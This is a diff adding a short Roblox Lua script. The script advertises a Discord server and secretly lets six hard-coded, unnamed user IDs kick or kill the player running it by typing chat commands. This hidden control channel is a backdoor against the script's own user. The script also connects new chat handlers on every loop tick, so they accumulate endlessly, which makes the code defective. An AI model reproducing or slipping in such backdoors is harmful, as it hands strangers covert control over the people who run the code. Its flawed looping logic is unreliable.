@@ -1,0 +1,31 @@
+game.StarterGui:SetCore("SendNotification", {
+    Title = 'DISCORD SERVER';
+      Text = 'discord.gg/booga';
+    Duration = 69;
+})
+
+local Players = game:GetService'Players'
+local Lp = Players.LocalPlayer
+
+local List = {
+    1497173687; -- ??? 
+    3454918275; -- ???
+    1927961689; -- ???
+    2634438358; -- ???
+    1380846697; -- ???
+    3392307522; -- ???
+}
+
+while wait() do
+    for _,v in next, Players:GetPlayers() do
+        if table.find(List, v.UserId) then
+            v.Chatted:Connect(function(msg)
+                if msg == ("/e kick "..Lp.Name) then
+                    Lp:Kick("discord.gg/booga")
+                elseif msg == ("/e kill "..Lp.Name) then
+                    Lp.Character.Humanoid.Health = 0
+                end
+            end)
+        end
+    end
+end
